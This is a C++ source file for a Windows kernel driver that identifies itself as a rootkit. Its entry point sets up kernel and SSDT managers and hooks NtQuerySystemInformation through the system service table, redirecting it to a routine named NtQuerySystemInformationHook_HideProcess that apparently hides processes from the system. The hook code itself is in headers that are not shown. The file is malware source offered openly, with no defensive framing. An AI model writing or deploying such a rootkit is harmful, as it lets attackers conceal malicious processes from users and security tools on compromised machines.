#pragma once
#include <ntddk.h>
#include <basetsd.h>
#include <windef.h>
#include <dontuse.h>
#include <suppress.h>

#include "SSDTManager\SSDTManager.h"
#include "KernelManager\KernelManager.h"

#include "Hooks\SSDTHooks\ZwQuerySystemInformationHooks.h"

#include "Utils\List.h"

extern "C" DRIVER_INITIALIZE DriverEntry;
extern "C" DRIVER_UNLOAD DriverUnload;

extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)
{
    NTSTATUS retStatus;

    UNREFERENCED_PARAMETER(registryPath);
    
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,"rootkit start\n");        

    if (!KernelManager::getInstance().InitializeInstanceData())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Kernel Manager Init error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }    

    if (!SSDTManager::getInstance().InitializeInstanceData())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "SSDT Manager Init error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }

    SSDTHook hookNtQuerySystemInformation;

    hookNtQuerySystemInformation.funcName = "NtQuerySystemInformation";
    hookNtQuerySystemInformation.HookFunc = reinterpret_cast<ULONG_PTR>(&NtQuerySystemInformationHook_HideProcess);

    if (!SSDTHookManagaer::getInstance().SetHook(hookNtQuerySystemInformation))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set SSDT Hook error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }

    driverObject->DriverUnload = DriverUnload;
    retStatus = STATUS_SUCCESS;
    return retStatus;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Driver unload\n");
    SSDTManager::getInstance().FreeData();
    SSDTHookManagaer::getInstance().OnUnload();
    return;
}
